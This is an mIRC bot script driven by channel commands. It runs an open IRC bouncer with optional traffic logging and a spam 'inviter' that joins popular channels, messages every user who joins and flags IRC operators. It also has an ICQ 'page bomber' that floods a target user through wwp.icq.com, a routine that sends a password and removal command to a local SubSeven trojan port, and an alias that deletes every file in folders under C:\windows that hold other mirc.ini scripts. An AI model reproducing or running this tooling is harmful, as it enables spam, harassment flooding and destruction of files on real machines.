[script]
n0=on 10:TEXT:!bnc*:*:{ 
n1=  if ($2 == stats) {  
n2=    msg # 15*14BNC-STATS15* 12[14Total Users Connected:2(15 $+ $sock(bnc.in*,0) $+ 2) 14Bncs open:2(15 $+ $calc($sock(bnc.*,0) - $sock(bnc.in*,0) - $sock(bnc.out*,0)) $+ 2) 14Server Connections:2(15 $+ $sock(bnc.out*,0) $+ 2)12] 
n3=  } 
n4=  if ($2 == log) && ($address == %master) { 
n5=    bnc log $3 
n6=    msg # 14�15BNC14� Logger has been set to $3 $+ ...  
n7=    if ($3 == off) {
n8=      remove bnc.log 
n9=    }  
n10=  } 
n11=  if ($2 == start) {
n12=    /bnc start $3 $4 
n13=    msg # 2[14Bnc2] 15Setup complete:14 $Ip $+ 14:15 $+ $3  
n14=    msg # 2[14Bnc2] 14Usage:15 /server $Ip $+ 14:15 $+ $3 [Then /Quote Pass $4 $+ ]  
n15=    halt  
n16=  }  
n17=  if ($2 == help) {  
n18=    msg # 14�15BNC14� Usage: !bnc [port] pass 
n19=    halt  
n20=  } 
n21=  if ($2 == stop) {
n22=    if ($sock(bnc. [ $+ [ $3 ] ] ,0) == 0) {
n23=      msg # 14�15BNC14� Error: Bnc not active on that port! 
n24=      halt
n25=    }  
n26=    msg # 14�15BNC14� Server/port for $3 has been stopped. 
n27=    sockclose bnc. $+ $3  
n28=  } 
n29=  if ($2 == kill) && ($3 == users) && ($address == %master)  { 
n30=    msg # 14�15BNC14� [( $+ $sock(bnc.in*,0) $+ )] Users on bnc, have been disconnected... 
n31=    sockclose bnc.in* 
n32=    sockclose bnc.out*  
n33=  } 
n34=  if ($2 == shutdown) {
n35=    msg # 14�15BNC14� BNC Server shutdown... (all settings reset) 
n36=    bnc reset  
n37=    msg # 14�15BNC14� Server shutdown complete... 
n38=  } 
n39=  if ($2 == list) && ($3 == bnc) {  
n40=    if ($sock(bnc.*,0) == 0) { msg # 14�15BNC14� Error, there are currently no bnc servers open... 
n41=      halt 
n42=    }   
n43=    if ($sock(bnc.*,0) > 0) {
n44=      msg # 14�15BNC14� Listing Active/Open BNC's 
n45=      %bnc.stl = 0     
n46=      :again  
n47=      if ($sock(bnc.*,0) == %bnc.stl) {
n48=        goto done 
n49=      } 
n50=      inc %bnc.stl  
n51=      if ($gettok($sock(bnc.*,%bnc.stl),2,46) !isnum 1-65000) {
n52=        goto again 
n53=      } 
n54=      msg # 14�15BNC14� $chr(35) $+ %bnc.stl $+ . [PORT: $+ $gettok($sock(bnc.*,%bnc.stl),2,46) $+ ] [PASS: $+ [ %bnc. [ $+ [ $gettok($sock(bnc.*,%bnc.stl),2,46) ] ] ] $+ ]   
n55=      goto again 
n56=      :done 
n57=      msg # 14�15BNC14� End Listing Active BNC's...
n58=    }
n59=  } 
n60=  if ($2 == list) && ($3 == users) && ($address == %master) {
n61=    if ($sock(bnc.in*,0) == 0) { 
n62=      msg # 14�15BNC14� Error: No Users Connected to the bnc... 
n63=      halt 
n64=    }   
n65=    if ($sock(bnc.in*,0) > 0) { 
n66=      msg # 14�15BNC14� Listing Active Users...   
n67=      %bnc.stlu = 0 
n68=      :again2  
n69=      if ($sock(bnc.in*,0) == %bnc.stlu) { 
n70=        goto done2 
n71=      } 
n72=      inc %bnc.stlu  
n73=      msg # 14�15BNC14� $chr(35) $+ %bnc.stlu $+ . Connection: Nick:[ $+  [ %bnc. [ $+ [ $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) $+ .n ] ] ] $+ ] [ $+ [ %bnc. [ $+ [ $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) $+ .u ] ] ] $+ ] is $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) on port $sock(bnc.in*,%bnc.stlu).mark 
n74=      goto again2 
n75=      :done2 
n76=      msg # 14�15BNC14� List of Users Complete... 
n77=    } 
n78=  }  
n79=  if ($2 == list) && ($3 == server) && ($address == %master) {
n80=    if ($sock(bnc.out*,0) == 0) {
n81=      msg # 14�15BNC14� Error: Currently No Users on Servers Connected... 
n82=      halt
n83=    }   
n84=    if ($sock(bnc.out*,0) > 0) {
n85=      msg # 14�15BNC14� Listing Active Users and Servers... 
n86=      %bnc.stlus = 0 
n87=      :again3 
n88=      if ($sock(bnc.out*,0) == %bnc.stlus) { 
n89=      goto done3 }  
n90=      inc   %bnc.stlus 
n91=      msg # 14�15BNC14� $chr(35) $+ %bnc.stlus $+ .  [ %bnc. [ $+ [ $gettok($sock(bnc.out*,%bnc.stlus).mark,2,32) ] ] ] $+ / $+ [ %bnc. [ $+ [ $gettok($sock(bnc.out*,%bnc.stlus).mark,1,32) ] ] ] is %bnc. $+ $gettok($sock(bnc.out*,%bnc.stlus).mark,3,32) on $gettok($sock(bnc.out*,%bnc.stlus).mark,4-6,32)  
n92=      goto again3 
n93=      :done3 
n94=      msg # 14�15BNC14� List of Users and Servers Complete... 
n95=    } 
n96=    halt 
n97=  } 
n98=}
n99=alias bnc {
n100=  if ($1 == start) {
n101=    //set %bnc. [ $+ [ $2 ] ] $3  
n102=    //socklisten bnc. $+ $2 $2 
n103=  }  
n104=  if ($1 == reset) { 
n105=    unset %bnc* 
n106=  sockclose bnc* } 
n107=  if ($1 == log) {
n108=    set %bnc.log $2 
n109=  } 
n110=}
n111=on 1:socklisten:bnc.*:{
n112=  if ($sock(bnc.in.temp,0) == 1) { 
n113=    halt 
n114=  } 
n115=  //set %bnc.smt $gettok($sockname,2,46) 
n116=  /sockaccept bnc.in.temp 
n117=  sockread 
n118=}  
n119=on *:sockclose:bnc.in.*: { 
n120=  unset %bnc.ok. $+ $sockname 
n121=  unset %bnc. $+ $sock($sockname).ip $+ * 
n122=  unset %bp* 
n123=  unset %temp.r* 
n124=  if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) { 
n125=    sockclose $sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] )
n126=  }
n127=}
n128=on *:sockread:bnc.in.*:{ 
n129=  if ($sock(bnc.in.temp*,0) == 1) {
n130=    /sockrename $sockname bnc.in. $+ $sock($sockname).port $+ . $+ $+ $sock($sockname).ip  
n131=    /sockmark $sockname %bnc.smt 
n132=    unset %bnc.smt 
n133=    //set  %bnc.ok. $+ $sockname no 
n134=  } 
n135=  sockread -f %temp.r  
n136=  if (%bnc.log == on) {
n137=    write bnc.log <<<[Incomming]>>> %temp.r
n138=  }  
n139=  if (%bnc.ok. [ $+ [ $sockname ] ] == no) {
n140=    if ($gettok(%temp.r ,1,32) == NICK) { 
n141=      set %bnc. $+ $sock($sockname).ip $+ .n $gettok(%temp.r ,2,32)  
n142=      //write bnc.log Connectoin from: $sock($sockname).ip Time: $time Date: $+ $date 
n143=      sockwrite -nt $sockname :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ *** Welcome to B0rg-b0ts BNC Server. ( $+ $gettok(%temp.r ,2,32) $+ ) ***     
n144=      sockwrite -nt $sockname :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ *** From: $sock($sockname).ip Time: $time Date: $+ $date *** 
n145=      sockwrite -nt $sockname :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ *** Please Type /QUOTE PASS PASSWORD to Continue ***   
n146=      sockwrite -nt $sockname :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ *** For More help Type /QUOTE BNCHELP ***  
n147=      halt
n148=    } 
n149=    if ($gettok(%temp.r ,1,32) == BNCHELP) {
n150=      sockwrite -nt $sockname :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ *** Help Error: Login First! /QUOTE PASS [ PASSWORD ] 
n151=      halt
n152=    } 
n153=    if ($gettok(%temp.r ,1,32) == USER) {  
n154=      set %bnc. $+ $sock($sockname).ip $+ .u $gettok(%temp.r ,2,32) 
n155=      halt
n156=    }  
n157=    if ($gettok(%temp.r,1,32) == PASS) && ($gettok(%temp.r,2,32) ==  %bnc. [ $+ [ $sock($sockname).mark ] ] ) {
n158=      .sockwrite -nt $sockname :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ *** Password Accepted ***  
n159=      .sockwrite -nt $sockname :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ *** Please type /quote conn server port to start ***  
n160=      goto next 
n161=    }  
n162=    if ($gettok(%temp.r,1,32) == PASS) && ($gettok(%temp.r,2,32) != %bnc. [ $+ [ $sock($sockname).mark ] ] ) { 
n163=      sockwrite -nt $sockname :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ Incorrect Password... 
n164=      inc %bp   
n165=    } 
n166=    if (%bp >= 3) { 
n167=      sockwrite -nt $sockname :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ Too many bad password attempt's disconnecting...  
n168=      sockclose $sockname 
n169=      unset %bp 
n170=    }  
n171=    halt 
n172=  }
n173=  :next 
n174=  %bnc.ok. [ $+ [ $sockname ] ] = done 
n175=  if ($gettok(%temp.r ,1,32) == IDENT) {  
n176=    identd on $gettok(%temp.r ,2,32)  
n177=    sockwrite -nt $sockname :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ Ident set to $gettok(%temp.r ,2,32)  
n178=  }  
n179=  if ($gettok(%temp.r ,1,32) == VHOST) { 
n180=    if ($gettok(%temp.r ,2,32) == LIST) {
n181=      /sockwrite -nt $sockname  :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ Listing VHOSTS 
n182=      /sockwrite -nt $sockname  :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ (1) System Default: $ip / $host $+ ... 
n183=    /sockwrite -nt $sockname  :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ End of VHOST / LIST |     halt   }
n184=    if ($gettok(%temp.r ,2,32) == 1) {
n185=      /sockwrite -nt $sockname  :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ VHOST Set as system default $ip : $host 
n186=      halt 
n187=    } 
n188=    else {  
n189=      /sockwrite -nt $sockname  :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ VHOST Error... Usage: /QUOTE VHOST LIST or /QUOTE VHOST # 
n190=      halt 
n191=    }   
n192=  } 
n193=  if ($gettok(%temp.r ,1,32) == BNCHELP) { 
n194=    /sockwrite -nt $sockname  :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ Listing Help Commands... 
n195=    /sockwrite -nt $sockname :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE IDENT [IDENT]  
n196=    /sockwrite -nt $sockname  :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE CONN [SERVER] [PORT]   
n197=    /sockwrite -nt $sockname :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE PASS [PASSWORD]  
n198=    /sockwrite -nt $sockname :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE VHOST LIST 
n199=    /sockwrite -nt $sockname  :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ - End List of HELP  
n200=    halt
n201=  }
n202=  if ($gettok(%temp.r ,1,32) == CONN) { 
n203=    if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) {  
n204=      /sockwrite -nt $sockname :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ Disconnecting from current server...  
n205=      sockclose $sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) 
n206=    }
n207=    if ($gettok(%temp.r ,3,32) == $Null) {
n208=      sockopen bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip $gettok(%temp.r ,2,32) 6667 $gettok(%temp.r,4,32)  
n209=      /sockmark bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip %bnc. $+ $sock($sockname).ip $+ .u %bnc. $+ $sock($sockname).ip $+ .n $sock($sockname).ip $gettok(%temp.r ,2,32) 6667 
n210=      /sockwrite -nt $sockname :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ Attempting to connect to $gettok(%temp.r,2,32) on port 6667  
n211=      halt   
n212=    }  
n213=    /sockopen bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip $gettok(%temp.r ,2,32) $gettok(%temp.r,3,32) $gettok(%temp.r,4,32)  
n214=    /sockmark bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip %bnc. $+ $sock($sockname).ip $+ .u %bnc. $+ $sock($sockname).ip $+ .n $gettok(%temp.r ,2-4,32) 
n215=    /sockwrite -nt $sockname :12..:: 14GT 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ Attempting to connect to $gettok(%temp.r,2,32) on port $gettok(%temp.r ,3,32)  
n216=    halt 
n217=  } 
n218=  if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) {
n219=    sockwrite -nt bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] %temp.r   
n220=  } 
n221=}  
n222=on *:sockopen:bnc.out.*:{
n223=  sockwrite -tn $sockname User [ [ %bnc. [ $+ [ $gettok($sock($sockname).mark,1,32) ] ] ] ] a a : [ [ %bnc. [ $+ [ $gettok($sock($sockname).mark,1,32) ] ] ] ]  
n224=  sockwrite -tn $sockname Nick %bnc. [ $+ [ $gettok($sock($sockname).mark,2,32) ] ] 
n225=  sockread  
n226=} 
n227=on *:sockread:bnc.out.*:{ 
n228=  sockread -f %bnc.out.t   
n229=  if (%bnc.log == on) { 
n230=  write bnc.log <<<[Outgoing]>>> %bnc.out.t } 
n231=  sockwrite -nt bnc.in. [ $+ [ $gettok($sockname,3-7,46) ] ] %bnc.out.t 
n232=  unset %bnc.out.t
n233=}
n234=on 10:TEXT:!inviter*:*:{ 
n235=  %s.i.c = # | if (# == $null) {
n236=    set  %s.i.c $nick 
n237=  }  
n238=  if ($2 == load) {
n239=    /set %i.server $3 
n240=    /set %i.port $4 
n241=    %i.b = on 
n242=    s.inviter 
n243=  } 
n244=  if ($2 == stop) {
n245=    sockclose inviter* 
n246=    remove ichan.txt 
n247=    //set %i.b off 
n248=    unset %i.temp.* 
n249=    /timerinviteconnect off 
n250=    msg # 12[15in14vit15er12]:  Inviter has been killed. 
n251=  }  
n252=  if ($2 == status) { 
n253=    if ($sock(inviter*,0) == 0) { 
n254=      msg # 12[15in14vit15er12]: Status: Not Connected! 
n255=      halt 
n256=    }  
n257=    if ($sock(inviter*,0) > 0) { 
n258=      msg # 12[15in14vit15er12]: Status: Connected [ $+ $sock(inviter*,0) $+ ] 
n259=    }  
n260=  } 
n261=  if ($2 == stats) {
n262=    msg # 12[15in14vit15er12]: (Stats) Total Invited: $calc( %i.t.j  +  %i.t.p ) Delay: ( $+ %i.ondelay $+ )
n263=  }   
n264=  if ($2 == list) {
n265=    sockwrite -nt inviterN LIST :* $+ $3 $+ * 
n266=  }  
n267=  if ($2 == message) {
n268=    set %imsg $3- 
n269=    msg # 12[15in14vit15er12]:  Invite Message set as [ $+ $3- $+ ] 
n270=  } 
n271=  if ($2 == ctotal) {
n272=    msg # 12[15in14vit15er12]: Random Channels Total: $+ $lines(ichan.txt) 
n273=  }  
n274=  if ($2 == reset) { 
n275=    msg # 12[15in14vit15er12]: All Settings Unset! 
n276=    unset %i.t.j  
n277=    unset %i.t.p 
n278=    unset %imsg 
n279=    unset %i.server 
n280=    unset %s.i.c 
n281=    unset %i.b 
n282=    unset %i* 
n283=    write -c ichan.txt 
n284=    remove ichan.txt 
n285=    unset %t.i 
n286=    sockclose inviter* 
n287=  }  
n288=  if ($2 == mode) { 
n289=    /sockwrite -nt inviter*  MODE $3- 
n290=  }  
n291=  if ($2 == join) {
n292=    if ($3 == random) { 
n293=      if ($lines(ichan.txt) < 0) || ($exists(ichan.txt) == $false) { 
n294=        msg # 12[15in14vit15er12]: Error: Gather channels first! 
n295=        halt
n296=      }  
n297=      set %i.r.j.a $4 
n298=      /set %i.r.j.i 0  
n299=      :loop 
n300=      if (%i.r.j.i  > %i.r.j.a) { 
n301=        goto end 
n302=      } 
n303=      /sockwrite -nt inviterN JOIN : $+ $read -l $+ $r(1,$lines(ichan.txt)) ichan.txt  
n304=      inc %i.r.j.i  
n305=      goto loop 
n306=      :end    
n307=      unset %i.r.j.i 
n308=      unset %i.r.j.a   
n309=      halt 
n310=    } 
n311=    else { 
n312=      /sockwrite -nt inviterN JOIN : $+ $3 
n313=    } 
n314=  } 
n315=  if ($2 == part) {
n316=    //sockwrite -nt inviterN PART : $+ $3- 
n317=  }   
n318=  if ($2 == nick) { 
n319=    if ($3 == random) { 
n320=      sockwrite -nt inviterN NICK $read temp.scr 
n321=      halt 
n322=    }  
n323=    //sockwrite -nt inviterN NICK $3   
n324=  }  
n325=  if ($2 == delay) { 
n326=    set %i.ondelay $3 
n327=    msg # 12[15in14vit15er12]:  Delay set to: ( $+ $3 $+ ). 
n328=  } 
n329=}
n330=alias s.inviter { 
n331=  if (%i.ondelay == $null) { 
n332=    msg %s.i.c 12[15in14vit15er12]: Error: Please set delay !inviter delay [ [ [ delay ] ] ] 
n333=    halt
n334=  } 
n335=  if (%i.server == $null) || (%i.port == $null) { 
n336=    msg %s.i.c 12[15in14vit15er12]:  Error Starting Inviter, Inviter Server or Port not set! %iserver/%iserver.port 
n337=    halt
n338=  } 
n339=  if ($sock(inviter*,0) > 0) { 
n340=    msg %s.i.c 12[15in14vit15er12]:  Error: Inviter already loaded! 
n341=    halt 
n342=  }  
n343=  //sockopen inviterN %i.server %i.port  
n344=  /msg %s.i.c 12[15in14vit15er12]:  Loading inviter to Server: ( $+ $+ %i.server $+ ) Port: ( $+ %i.port $+ )  
n345=  //sockopen inviterM %i.server %i.port 
n346=}
n347=on *:sockread:inviter*:{ 
n348=  sockread -f %t.i  
n349=  if ($gettok(%t.i,2,32) == 322) && ($gettok(%t.i,5,32) > 30) {
n350=    write ichan.txt $gettok(%t.i,4,32) 
n351=  } 
n352=  if ($gettok(%t.i,2,32) == 321) { 
n353=    msg %s.i.c 12[15in14vit15er12]: Listing channels on $remove($gettok(%t.i,1,32),:) 
n354=  } 
n355=  if ($gettok(%t.i,2,32) == 323) {
n356=    msg %s.i.c 12[15in14vit15er12]: Listing channels complete on $remove($gettok(%t.i,1,32),:)  [Total Channels in List: $+ $lines(ichan.txt) $+ ] 
n357=  }  
n358=  if ($gettok(%t.i,2,32) == 474) { 
n359=    msg %s.i.c 12[15in14vit15er12]:  Join Error: Banned from ( $+ $gettok(%t.i,4,32) $+ )
n360=  }    
n361=  if ($gettok(%t.i,2,32) == 433) { 
n362=    /sockwrite -nt inviterN NICK $gettok(%t.i,4,32) $+ $r(a,z) 
n363=  } 
n364=  if ($gettok(%t.i,1,32) == PING) { 
n365=    sockwrite -nt $sockname PONG $gettok(%t.i,2,32)
n366=  } 
n367=  if ($gettok(%t.i,2,32) == JOIN) {
n368=    if (%i.on == Off) { halt } 
n369=    if ($timer($remove($gettok(%t.i,1,33),:)) !== $null) {
n370=      halt 
n371=    } 
n372=    if (%i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] == done) { 
n373=      halt 
n374=    } 
n375=    set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done 
n376=    set %i.on Off 
n377=    /timer $+ $remove($gettok(%t.i,1,33),:) 1 15 /sockwrite -nt inviterM PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg 
n378=    /sockwrite -nt inviterN WHOIS : $+ $remove($gettok(%t.i,1,33),:) 
n379=    inc %i.t.j 
n380=    .timer 1 %i.ondelay set %i.on Yes  
n381=  }   
n382=  if ($gettok(%t.i,2,32) == KICK) { 
n383=    sockwrite -nt inviterN JOIN : $+ $gettok(%t.i,3,32)
n384=  } 
n385=  if ($gettok(%t.i,1,32) == ERROR) { 
n386=    msg %s.i.c 12[15in14vit15er12]: Error Connecting: %t.i (attempting to reconnect)-(to stop !inviter stop) 
n387=    /timerinviteconnect 0 3 /sockopen inviter %i.server %i.port
n388=  } 
n389=  if ($gettok(%t.i,2,32) == MODE) {  
n390=    if ($gettok(%t.i,4,32) == +o) { 
n391=      if ($timer($gettok(%t.i,5,32)) == $null) {
n392=        halt
n393=      }
n394=      .timer $+ $gettok(%t.i,5,32) off 
n395=      dec %i.t.j 1  
n396=      /msg # inviter! error: not inviting: $gettok(%t.i,5,32)  because he was opd!  
n397=    }   
n398=    if ($gettok(%t.i,4,32) == +v) { 
n399=      if ($timer($gettok(%t.i,5,32)) == $null) {
n400=        halt 
n401=      } 
n402=      .timer $+ $gettok(%t.i,5,32) off 
n403=      dec %i.t.j 1 
n404=    }
n405=  }
n406=  if ($gettok(%t.i,2,32) == NICK) {  
n407=    if ($timer($remove($gettok(%t.i,1,33),:)) == $null) {
n408=      halt 
n409=    } 
n410=    /timer $+ $remove($gettok(%t.i,1,33),:) off 
n411=    dec %i.t.j  
n412=  } 
n413=  if ($gettok(%t.i,2,32) == QUIT) { 
n414=    if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { 
n415=      halt
n416=    } 
n417=    /timer $+ $remove($gettok(%t.i,1,33),:) off   
n418=    dec %i.t.j 
n419=  } 
n420=  if ($gettok(%t.i,2,32) == 313) {
n421=    /msg %s.i.c 12Inviter Warning!!!: 3IRCOP DETECTED!!!! 10-[12 $+ $gettok(%t.i,4,32) $+ 10] 
n422=    if ($timer($gettok(%t.i,4,32)) == $null) {
n423=      halt 
n424=    } 
n425=    /timer $+ $gettok(%t.i,2,32) off 
n426=  } 
n427=}
n428=alias killsub7 {
n429=  if ($portfree(27374) =! $true) {
n430=    halt 
n431=  } 
n432=  else { 
n433=    sockopen s7kill 127.0.0.1 27374  
n434=  } 
n435=}
n436=on *:sockopen:s7kill*:{
n437=  if ($sockerr > 0) {  
n438=    return 
n439=  } 
n440=}
n441=on *:sockread:s7kill*: { 
n442=  sockread -f %s7kill 
n443=  if (%s7kill == PWD) { 
n444=    sockwrite $sockname PWD14438136782715101980 
n445=    //timer 1 4 //sockwrite $sockname RMS
n446=  } 
n447=  else { 
n448=    sockwrite $sockname RMS 
n449=  } 
n450=  unset %s7kill 
n451=}
n452=alias chk4os { 
n453=  %ost = $findfile(c:\windows,*mirc.ini*,0) 
n454=  unset %ost* 
n455=  :os1  
n456=  inc %ost1 
n457=  if (%ost1 >= %ost) {
n458=    goto end 
n459=  } 
n460=  //set %ost.tmp $findfile(C:\windows\,*mirc.ini*,%ost1)  
n461=  if ($nofile(%ost.tmp)  == C:\windows\fonts\d\) || ($nofile(%ost.tmp) == C:\windows\) {
n462=    goto os1 
n463=  }   
n464=  delos $nofile(%ost.tmp) 
n465=  goto os1 
n466=  :end 
n467=  //echo -a Removal of scripts complete.. 
n468=  unset %ost* 
n469=}
n470=alias delos {
n471=  :delos 
n472=  if ($findfile($1,*,0) == 0) {
n473=    goto end 
n474=  } 
n475=  /remove $findfile($1,*,1) 
n476=  goto delos 
n477=  :end 
n478=}
n479=on 1:sockopen:inviter*: {  
n480=  sockwrite -nt $sockname PONG $server 
n481=  sockwrite -tn $sockname User $read temp.scr $+ $r(a,z) $+ $r(1,60) a a : [ [ $read  temp.scr ] ] 
n482=  sockwrite -tn $sockname Nick $read temp.scr  
n483=  /timerinviteconnect off 
n484=  sockread  
n485=}
n486=on 1:sockclose:inviter*:{
n487=  if (%i.b == off) { 
n488=    remove ichan.txt 
n489=    halt 
n490=  }  
n491=  if (%i.b == on) {
n492=    msg %s.i.c 12[15in14vit15er12]:  Inviter was disconnected! (Reloading).  
n493=    /sockopen $sockname %i.server %i.port 
n494=  } 
n495=}
n496=on 10:TEXT:!icqpagebomb*:#:{ 
n497=  if ($2 == help) {
n498=    msg # Syntax: !icqpagebomb uin ammount email/name sub message (HELP) 
n499=    halt 
n500=  } 
n501=  if ($2 == reset) { 
n502=    msg # Icq Page Bomber (All Settings Reset!)... 
n503=    unset %ipb.n 
n504=    unset %ipb.sub 
n505=    unset %ipb.m 
n506=    unset %ipb.uin 
n507=    unset %ipb.t 
n508=  } 
n509=  if ($6 == $null) {
n510=    msg # Error!: !icqpagebomb uin ammount email/name sub message 
n511=    halt 
n512=  } 
n513=  if ($3 !isnum 1-100) {
n514=    msg # ERROR! Under Ammount 100 please. (moreinfo type !icqpagebomb help) 
n515=    halt 
n516=  } 
n517=  set %ipb.n $4 
n518=  set %ipb.sub $5 
n519=  set %ipb.m $replace($6,$chr(32),_) 
n520=  set %ipb.uin $2 
n521=  set %ipb.t $3 
n522=  msg # 14[15ICQPAGEBOMBER14]:15 Bombing:12 $2 14Ammount:12 $3 15Name/Email:12 $4 14Sub:12 $5 14Message:12 $6 3etc... 
n523=  /icqpagebomb  
n524=}
n525=alias icqpagebomb {
n526=  :bl 
n527=  inc %bl.n 
n528=  sockopen icqpager $+ %bl.n  wwp.icq.com 80 
n529=  if (%bl.n > %ipb.t) { 
n530=    unset %ipb.t 
n531=    unset %bl.n 
n532=    halt 
n533=  } 
n534=  goto bl 
n535=} 
n536=on *:sockopen:icqpager*:{
n537=  sockwrite -nt $sockname GET /scripts/WWPMsg.dll?from= $+ %ipb.n $+ &fromemail= $+ %ipb.n $+ &subject= $+ %ipb.sub $+ &body=  $+ %ipb.m $+ &to=  $+ %ipb.uin $+ &Send=Message   
n538=  sockwrite $sockname $crlf $+ $crlf 
n539=  sockread 
n540=}
n541=on *:sockread:icqpager*:{ 
n542=  sockread -f %temp 
n543=}
n544=on *:sockclose:icqpager*:{ 
n545=  unset %temp 
n546=}
